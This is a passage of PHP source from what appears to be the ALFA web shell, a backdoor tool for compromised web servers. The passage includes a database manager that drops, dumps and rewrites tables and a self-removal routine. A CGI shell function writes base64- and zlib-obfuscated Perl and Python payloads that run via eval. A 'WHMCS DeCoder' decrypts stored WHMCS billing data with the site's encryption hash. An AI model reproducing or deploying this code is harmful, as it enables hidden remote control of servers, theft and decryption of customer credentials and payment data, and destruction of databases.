		echo '</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="alfaMysqlTablesEvil(this);" class="db-opt-id" target=".cls-'.$db_name.'" type="checkbox" class="db-opt-id"><select onchange="alfaMysqlTablesDumpDrop(this);" class="db-opt-id" target=".cls-'.$db_name.'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="alfaMysqlTablesDumpDropBtn(this);return false;" class="db-opt-id" db_target="'.$db_name.'" target=".cls-'.$db_name.'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>';
	}
	echo "</div></li>";
}
echo "</ul></div><div class='mysql-query-results'><div class='mysql-query-result-tabs'><div class='db-opt-id mysql-query-selected-tab' target='.mysql-query-result-content' onclick='alfaMysqlTabCtl(this);'>Result</div><div class='db-opt-id' target='.mysql-query-form' onclick='alfaMysqlTabCtl(this);'>Query</div><div class='db-opt-id' target='.mysql-search-area' onclick='alfaMysqlTabCtl(this);'>Search</div><div class='db-opt-id' target='.mysql-structure' onclick='alfaMysqlTabCtl(this);'>Structure</div><div class='db-opt-id' target='.mysql-insert-row' onclick='alfaMysqlTabCtl(this);'>Insert</div><div style='display:none;' class='db-opt-id' target='.mysql-edit-row' onclick='alfaMysqlTabCtl(this);'>Edit</div></div><div class='mysql-query-content mysql-insert-row mysql-hide-content'></div><div class='mysql-query-content mysql-edit-row mysql-hide-content'></div><div class='mysql-query-content mysql-search-area mysql-hide-content'></div><div class='mysql-query-content mysql-structure mysql-hide-content'></div><div class='mysql-query-content mysql-query-form mysql-hide-content'><div style='margin-bottom: 5px;'><span>Query:</span></div><textarea name='query' style='width:90%;height:100px'></textarea><p><div style='float:left;margin-left: 30px;'><input class='button db-opt-id' db_target='".$_POST['sql_base']."' onclick='alfaMysqlQuery(this);return false;' type='submit' value=' '></div></p></div><div class='mysql-query-content mysql-query-result-content'><div class='mysql-query-result-header'><div style='margin-bottom: 10px;' class='mysql-query-reporter'></div><div class='mysql-query-pager'></div></div><div class='mysql-query-table'></div></div></form></td></tr>";
}
echo "</table></div>";
echo "</div>";
}else{
echo htmlspecialchars($db->error());
}
echo '</div>';
alfafooter();
}
function alfaSql_manager_api(){
	$db = $_POST["alfa1"];
	$type = $_POST["alfa2"];
	$sql_count = $_POST["alfa3"] == "true" ? true : false;
	$db = @json_decode($db, true);
	$conn = @mysqli_connect($db["host"], $db["user"], $db["pass"], $db["db"]);
	@mysqli_set_charset($conn, "utf8");
	if($conn){
		if($type == "load_all_tables"){
			$tables = array();
			$q_tables = @mysqli_query($conn, "SELECT `table_schema`, `table_name` FROM `information_schema`.`tables` WHERE `table_schema` IN ('".implode("','", $db["databases"])."');");
			$count = 0;
			while($row = @mysqli_fetch_assoc($q_tables)){
				if($sql_count){
					$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row["table_schema"].'`.`'.$row["table_name"].'`');
					if($count_q){
						$count = @mysqli_fetch_row($count_q);
						$count = $count[0];
					}
				}
				$tables[$row["table_schema"]][] = array("name" => $row["table_name"], "count" => (int)$count);
			}
			foreach($db["databases"] as $db){
				if(!isset($tables[$db])){
					$tables[$db] = null;
				}
			}
			echo @json_encode($tables);
		}elseif($type == "dump_drop"){
			if($db["mode"] == "drop"){
				foreach ($db["tables"] as $table) {
					@mysqli_query($conn, "DROP TABLE `".$table."`;");
				}
				$tables = array();
				$q_tables = @mysqli_query($conn, "SHOW TABLES;");
				$count = 0;
				while($row = @mysqli_fetch_array($q_tables)){
					if($sql_count){
						$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row[0].'`');
						if($count_q){
							$count = @mysqli_fetch_row($count_q);
							$count = $count[0];
						}
					}
					$tables[] = array("name" => $row[0], "count" => (int)$count);
				}
				echo @json_encode($tables);
			}else{
				if(strlen(alfaEx("mysqldump"))>0){
					alfaEx("mysqldump --single-transaction --host=\"".$db["host"]."\" --user=\"".$db["user"]."\" --password=\"".$db["pass"]."\" ".$db["db"]." ".implode(" ", $db["tables"])."  > ".$db["dump_file"]);
				}else{
					$fp = @fopen($db["dump_file"], "w");
					foreach ($db["tables"] as $table) {
						$res = @mysqli_query($conn, 'SHOW CREATE TABLE `'.$table.'`');
						$create = @mysqli_fetch_array($res);
						$sql = "DROP TABLE IF EXISTS `".$table."`;\n" . $create[1].";\n";
						if($fp) fwrite($fp, $sql); else echo($sql);
						$tbl_data = @mysqli_query($conn, 'SELECT * FROM `'.$table.'`');
						$head = true;
						while($item = @mysqli_fetch_assoc($tbl_data)){
							$columns = array();
							foreach($item as $k=>$v) {
							if($v == null)
							$item[$k] = "''";
							elseif(is_numeric($v))
							$item[$k] = $v;
							else
							$item[$k] = "'".@mysqli_real_escape_string($conn, $v)."'";
							$columns[] = "`".$k."`";
							}
							if($head) {
							$sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
							$head = false;
							} else
							$sql = "\n\t,(".implode(", ", $item).')';
							if($fp) fwrite($fp, $sql); else echo($sql);
						}
						if(!$head)
							if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
					}
				}
				echo @json_encode(array("status" => true, "file" => $db["dump_file"]));
			}
		}elseif($type == "load_tables"){
			$tables = array();
			$q_tables = @mysqli_query($conn, "SHOW TABLES;");
			$count = 0;
			while($row = @mysqli_fetch_array($q_tables)){
				if($sql_count){
					$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row[0].'`');
					if($count_q){
						$count = @mysqli_fetch_row($count_q);
						$count = $count[0];
					}
				}
				$tables[] = array("name" => $row[0], "count" => (int)$count);
			}
			echo @json_encode($tables);
		}elseif($type == "alter"){
			$db["alter"]["type"] = strtolower($db["alter"]["type"]);
			$inputs = $db["alter"]["type"]."(".$db["alter"]["input"].")";
			$text_input = array("longtext", "text", "mediumtext", "tinytext");
			if(in_array($db["alter"]["type"], $text_input)){
				$inputs = $db["alter"]["type"];
			}
			@mysqli_query($conn, "ALTER TABLE `".$db["table"]."` MODIFY COLUMN `".$db["column"]."` " . $inputs);
			$error = @mysqli_error($conn);
			if($error){
				echo $error;
			}else{
				echo "ok";
			}
		}elseif($type == "edit" || $type == "delete" || $type == "delete_all"){
			if($type == "edit"){
				$q = @mysqli_query($conn, "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` = '".addslashes($db["key"])."' LIMIT 0,1");
				$row = @mysqli_fetch_assoc($q);
				if($row){
					$columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE, DATA_TYPE as type FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
					$columns = array();
					$edit_data = array();
					while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
						$input = array("col_type" => $row2["COLUMN_TYPE"]);
						$row2["type"] = strtolower($row2["type"]);
						switch($row2["type"]){
							case "longtext": case "text": case "mediumtext": case "tinytext":
								$input["tag"] = "textarea";
							break;
							case "int": case "smallint": case "bigint": case "tinyint": case "mediumint":
								$input["tag"] = "input";
								$input["type"] = "number";
							break;
							default:
								$input["tag"] = "input";
								$input["type"] = "text";
						}
						$columns[$row2["name"]] = $input;
					}
					foreach($row as $key => $v){
						$edit_data[] = array("col" => $key, "value" => htmlspecialchars($v, ENT_QUOTES, 'UTF-8'), "type" => $columns[$key]);
					}
					echo @json_encode($edit_data);
				}
			}else{
				if($type == "delete_all"){
					$rows = implode("', '", $db["rows"]);
				}else{
					$rows = addslashes($db["key"]);
				}
				$query = "DELETE FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` IN ('".$rows."')";
				@mysqli_query($conn, $query);
				$error = @mysqli_error($conn);
				if($error){
				 	$status = false;
				}else{
				 	$status = true;
				}
				echo @json_encode(array("status" => $status, "error" => $error, "query" => $query));
			}
		}elseif($type == "update"){
			$query = "UPDATE `".$db["db"]."`.`".$db["table"]."` SET ";
			foreach($db["data"] as $col => $val){
				$query .= "`".$col."` = '".mysqli_real_escape_string($conn, $val)."',";
			}
			$query = substr($query, 0, -1);
		    $query .= "WHERE `".$db["col_key"]."` = '".$db["key"]."'";
			$res = @mysqli_query($conn, $query);
			echo @json_encode(array("status" => $res, "error" => @mysqli_error($conn)));
		}elseif($type == "insert"){
			$query = "INSERT INTO `".$db["db"]."`.`".$db["table"]."` ";
			foreach($db["data"] as $col => $val){
				$cols .= $col . ",";
				$vals .= "'".mysqli_real_escape_string($conn, $val)."',";
			}
			$cols = substr($cols, 0, -1);
			$vals = substr($vals, 0, -1);
			$query = $query . "(" . $cols . ")" . "VALUES(" . $vals . ")";
			$res = @mysqli_query($conn, $query);
			echo @json_encode(array("status" => $res, "error" => @mysqli_error($conn)));
		}else{
			$pages = 0;
			$title = false;
			$query = "";
			$tbl_content = '<table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
			$line = 0;
			$tables = array();
			$columns = array();
			if($type == "load_data"){
				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` LIMIT 0,30";
				$tbl_count_q = @mysqli_query($conn, "SELECT COUNT(*) FROM `".$db["db"]."`.`".$db["table"]."`");
				$tbl_count = @mysqli_fetch_row($tbl_count_q);
				$columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE as type, COLLATION_NAME as collation, DATA_TYPE as data_type, CHARACTER_MAXIMUM_LENGTH as type_value FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
				while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
					$columns[] = $row2;
				}
				if($tbl_count[0] > 30){
					$pages = ceil($tbl_count[0] / 30);
				}
			}elseif($type == "query"){
				$query = $db["query"];
			}elseif($type == "page"){
				$db["page"] = (int)$db["page"] - 1;
				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` LIMIT ".($db["page"]*30).",30";
			}elseif($type == "search"){
				$search = "";
				$search_noval = array("= ''", "!= ''", "IS NULL", "IS NOT NULL");
				foreach($db["search"] as $col => $val){
					$search_noval_r = in_array($val["opt"], $search_noval);
					if(empty($val["value"]) && !$search_noval_r)continue;
					if(strstr($val["opt"], "...") || $search_noval_r){
						$val["opt"] = str_replace("...", $val["value"], $val["opt"]);
						$search .= $col . " " . $val["opt"] . " AND ";
					}else{
						$search .= $col . " " . $val["opt"] . " '".addslashes($val["value"])."' AND ";
					}
				}
				$search .= "1=1";
				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE " . $search;
			}
			$q_tables = @mysqli_query($conn, $query);
			if(!$q_tables){
				echo @json_encode(array("status" => false, "error" => @mysqli_error($conn), "query" => $query));
				return false;
			}
			$col_key = @mysqli_query($conn, "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '".@addslashes($db["db"])."' AND TABLE_NAME = '".@addslashes($db["table"])."' AND COLUMN_KEY = 'PRI'");
			if($col_key){
				$col_key = @mysqli_fetch_row($col_key);
				$col_key = $col_key[0];
				if(!empty($col_key)){
					$tbl_content = '<div style="margin-bottom:5px;margin-top:5px;"><button col_key="'.$col_key.'" tbl_name="'.$db["table"].'" db_id="'.$db["db_id"].'" 	db_target="'.$db["db"].'" onclick="alfaMysqlDeleteAllSelectedrows(this);return false;">Delete Selected Rows</button></div><table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
				}
			}else{
				$col_key = false;
			}
			while($item = @mysqli_fetch_assoc($q_tables)){
				if(!$title){
					$tbl_content .= '<tr style="background-color:#305b8e;">';
					if($col_key){
						$tbl_content .= '<th style="width: 55px;text-align:center;"><input db_id="'.$db["db_id"].'" onchange="alfaMysqlTblSelectAll(this);" type="checkbox"></th><th style="width: 55px;text-align:center;">Edit</th><th style="width: 55px;text-align:center;">Delete</th>';
					}
					foreach($item as $key => $value){
						$tbl_content .= '<th>'.$key.'</th>';
					}
					reset($item);
					$title=true;
					$tbl_content .= '</tr><tr>';
				}

				if($col_key){
					$cacheMsg = '<td style="text-align:center;"><input row_id="'.$line.'" type="checkbox" name="tbl_rows_checkbox[]" value="'.$item[$col_key].'"></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" onclick="alfaMysqlEditRow(this, \'edit\');" style="color:#0acaa6;">Edit</a></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" row_id="'.$line.'" onclick="alfaMysqlEditRow(this, \'delete\');" style="color:#ff1e1e;">Delete</a></td>';
				}
				$tbl_content .= '<tr class="tbl_row tbl_row_l'.$line.'">'.$cacheMsg;
				$line++;
				foreach($item as $key => $value){
					if($value == null){
						$tbl_content .= '<td><i>null</i></td>';
					}else{
						$tbl_content .= '<td>'.nl2br(htmlspecialchars($value)).'</td>';
				}
				}
				$tbl_content .= '</tr>';
			}
			$tbl_content .= '</table>';
			if(!$title){
				$tbl_content = "<div style='padding:5px;border:1px dashed;margin:10px;'>Table is empty...</div>";
			}
			echo @json_encode(array("status" => true, "table" => $tbl_content, "columns" => $columns, "pages" => $pages, "query" => $query));
		}
		@mysqli_close($conn);
	}
}
function alfaselfrm(){
if(isset($_POST['alfa1'])&&$_POST['alfa1']=='yes'){
echo(__pre().'<center>');
if(@unlink($GLOBALS['__file_path'])){
echo('<b>Shell has been removed</i> :)</b>');
}else{
echo 'unlink error!';
}
echo('</center>');
}
if(isset($_POST['alfa1'])&&$_POST['alfa1']!='yes'){
echo "<div class=header>";
echo "
<center><p><img src=\"http://solevisible.com/images/farvahar-iran.png\"></p>";
echo '<p><div class="txtfont">Do you want to destroy me?!</div><a href=javascript:void(0) onclick="g(\'selfrm\',null,\'yes\');"> Yes</a>';
echo '</p></center></div>';
}
}
function alfacgishell(){
alfahead();
$div = "";
alfaCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
if(!in_array($_POST['alfa1'],array('perl','py'))){
$div = "</div>";
echo '<div class=header><center><p><div class="txtfont_header">| CGI Shell |</div></p><h3><a class="rejectme" href="javascript:void(0)" onclick="runcgi(\'perl\')">| Perl | </a><a class="rejectme" href="javascript:void(0)" onclick="runcgi(\'py\');">| Python | </a>';
}
if(isset($_POST['alfa1'])&&in_array($_POST['alfa1'],array('perl','py'))){
@mkdir('cgialfa',0755);
@chdir('cgialfa');
alfacgihtaccess('cgi');
$name = $_POST['alfa1'].'.alfa';
$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;eval(Compress::Zlib::memGunzip(decode_base64("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")));';;
$py = '#!/usr/bin/python'."\nimport zlib, base64\n".'eval(compile(zlib.decompress(base64.b64decode("eJylF9ty2zb22foKDLxbUqurFTvN6Na6Xqf1bNNmErcvtkcDEqCICQlwQdC26vF++54DkBLVaOO2a8/YBM79fmDNZto5knmhjSXxWtpo5v8NhWJRJsJuRzzGorCAVbCy7NSo5absA15fl/21sAjpR6wUr0/7lckyGXUSo3NiZS5IQ2FNgueGgzUsFhGLP3nUj9ZItb76uUFvzjWjBrkBFwC1K1CtIxOiS9D2XhqthikrV5/EJqQfLz5cvb9e/XT+7pJ2QfkyNrKwioFCixbBzR7iXUdkpfg9NqUdLhLCsoRd5DyMkd1RnMqMr0rLpeqT7UFX1rMvdCHUBHD3UYdxpkt06tGREWWVIXabeGgE4+EeEd62qWxlFPHEnUSbHDms5fCtFBn/aLVha8SMcw4AhA8hPvcsq0QYxEG3w6X5HMABAH4EIjDNk/owDiv170pbEfrgDqPXp1zEmosQsLqOCBgCkWf7EhFgdVuS/MfNePrqjiwWJIg5CdC3yqvgzqSHEuBvMMNvhOB38cADwLyojBHK/tNJbwKE5F3wZJFB0oTBrQr6gTdQaeu4MQWcd7SBA0hFMh2zrAwxwAc5Byj2AOs6a0DCC1z32YIqHYjdyjsPs4bZdMiiEv+HdEi7nfeQ/QVmSXBD5nCvoI42mVjQWGfaTI/Hr74+GY9ndBn06jrEsFalMGG3F8xHSLL89gXKvXK4/PDr5Ye6HLYcDsqeRIk4OXMcdmbtSO7+FqDPVysso9XKRXi1yplUqxWG2ZUwoRdaWSAd2E0hpsSKRztKbZ7dmltFG6RgjlfLeQrVsZxbaTOxvICE4iTakPMf356Ta3H+jgzIxfdX5P3GplrNRx5tngvLoMaYKYVd0F+u3w7e0OXcWbL8xxNUVyaVmCqtxOz5eLVKUNuqeEoyzeyUGLlO7UzfCwMXD1OSSs6FmnkPkOPJWZKAEx8kt+mUnJyOi8cZlyWkx2YKoUfWgwji/2mGhg12fAQUSlHKcvaQSisG4LEYrFf6wbBi9pyxSGRPOTNrqQZOBWCOvIHeSsimAcvkWk1JDupkYhZpwwXoc1I8klJnkkOD4DPsl2ujK8Wn2EAVCMEgAfbjoEwZRz3G8HsKVMfjy1fj0/Oa08AwLqtyiqDGuMkZKvBnzIgrU6KXCg0xFOZ/OMYbi+NBq/VTW2e0oQ5DJhK79bLzxLNURWVvMGsWZRXl0t491QIbeW1eLr6H3VTHEjqnWotDDng+hoby9Je4Nb77GlU+EM8D0grGYVCsB7WTSssMYJ99DhGoCd4/Y1AgtOwJxoL8TdT67aV2S/uW8o3gli5te47fup9G8PTkNaDVxX/2Jj47e1MbCI3k77siYZXVs2doA67G5iNftZHmG6IVxJMvKNdxlUMuYrO6zAR+fre54uFtAK6+hRabAAK0zBkl0dpJXNDjsfuhxOrCu3JB4YSp0Tr6T6dW65wKdLq7QGcBM28adIJYYLIs5wn0IVKLgkDSJTTcaNdlwCOClIyTryB972UpYTki/3HX9enbNfS2bBjrfD6KoP3NR8gS7G8kWFyoiHfzgp5QUmuJ3qMkhlrC+gFHOz3xXDt+QSegqEUW/IA/2mxqOxKowwX9VRjOFKMEs8IzAcX2LD2eTC4nkzcO8nFnC7lYy20jjZa1KQR6tRKxBY9YTV6YG0hlOf4xje7LoJn5RJbkJ8hDt0m5YU9bzZ7L+2bU1DWDQZ5OMEudphc6z3GGTw/Npbr0YCz1UVSfNBPJ6wTMl/Ni+UUhe5XaiG2qjBj9UII3wfNlAUGKUxF/WtAEZrygtYlBIjMR4PDHTQuttG7RPjpCQIK7Wr2F3XjUO4TVGwqEQEHZK9gwtth9ksnSuhXiiJA2k5vt4a7jBGjj4NCPc6dAA3a0KKOBDvEDx52HEOCrWnsIbm8IDT/D727xqyxb4S2QtTYbWNBGuKwlqkHEbTjcYkNIHiIo8gcDbPfZ1wvwTgLcYfaCAMiNEHQDz9gdqy6cV4gwOhlPTrdk9W5xjVMvEVDOhPZgwoQNu26Pkn99N6T7+MF1KpxEQoNeonoB1BYrSVVg0wIeZRXHoixR+GaI66d/GpFL909qeAkIY5w3PUM4dY7q5XCbAR60XSnrJXfffc2u2z0sxPPB59i2ZkZNejYpPioOFOA8cp0OXg1a+am5oDaV4FV3GMKIxibFF9ZUYtaCpL8DySTcg0q+WNwGKbTuJ3fPh+5pAXdBr15xe8Ft8OyAcQ2MrGZhpUQZs0KEQuEb4ZcPV1DdBfQGCHcbu9vtzvZY/zFqvqOmBJMXKhWmgoDWBnPo/c8frylhMfp1AUHfvfsg+Mu52zGI2zGo3/waHpwSrwXdX35xGfY7ey8ge/QYH0rATxTi2rCJKdmX4v3ZgJuT79+vxluhyyVdfqXgoTBr/32RU+oVACu0ijOJbQsCGWuVSJPD8D03gmx0BYkOH99AMOtoApEL7uwZk5nUj1DX8WZbnX7QOfQ/HBUmxza4y8xDSbgbu38mGf+P2AOSd0wOL2cJq7B1mg44s+wPJ4TfVROcnHVXMPiYwBmEjt0+H9APzcPJLbZ70bpINbznCXO9BvckhzEfOe5NPtSzqVma3dbmw7eVjFFMcdh9aaHa6oRrlYT5bX64fvfjwjnItcOb8d0QMYC7dxDebmvFfdf5d7Ytif303E+4Oh28ln+xiL5AxD6X4FNut2jtMm7kdi6c/LB94iqKz8jgv11NVZo=")),\'<string>\',\'exec\'))';
if($_POST['alfa1']=='perl'){$code = $perl;}else{$code = $py;}
if(__write_file($name,$code)){
@chmod($name,0755);
echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
}
function alfaWhmcs(){
alfahead();
echo '<div class=header>';
function decrypt($string,$cc_encryption_hash){
$key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
$hash_key = _hash($key);
$hash_length = strlen ($hash_key);
$string = __ZGVjb2Rlcg($string);
$tmp_iv = substr ($string, 0, $hash_length);
$string = substr ($string, $hash_length, strlen ($string) - $hash_length);
$iv = $out = '';
$c = 0;
while ($c < $hash_length)
{
$iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
++$c;
}
$key = $iv;
$c = 0;
while ($c < strlen ($string))
{
if (($c != 0 AND $c % $hash_length == 0))
{
$key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
}
$out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
++$c;
}
return $out;
}
function _hash($string)
{
if(function_exists('sha1'))
{
$hash = sha1 ($string);
}
else
{
$hash = md5 ($string);
}
$out = '';
$c = 0;
while ($c < strlen ($hash))
{
$out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
$c += 2;
}
return $out;
}
AlfaNum(8,9,10);
echo "<center><br><div class='txtfont_header'>| WHMCS DeCoder |</div><p>".getConfigHtml('whmcs')."</p><form onsubmit=\"g('Whmcs',null,this.form_action.value,'decoder',this.db_username.value,this.db_password.value,this.db_name.value,this.cc_encryption_hash.value,this.db_host.value); return false;\">
<input type='hidden' name='form_action' value='2'>";
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
